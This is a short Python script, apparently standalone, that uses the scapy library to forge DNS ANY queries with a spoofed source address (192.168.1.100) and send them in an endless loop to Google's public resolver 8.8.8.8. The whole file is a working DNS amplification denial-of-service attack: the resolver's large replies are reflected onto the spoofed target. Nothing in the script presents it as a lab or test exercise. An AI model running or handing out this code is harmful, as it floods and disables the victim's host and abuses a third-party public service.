from scapy.all import *

target_ip = "192.168.1.100"  # IP address of the target
dns_resolver_ip = "8.8.8.8"  # Google's public DNS resolver
domain = "example.com"  # Domain to request

# Craft DNS query packet with spoofed source IP
packet = IP(src=target_ip, dst=dns_resolver_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain, qtype="ANY"))

# Send the packet in a loop
send(packet, loop=1)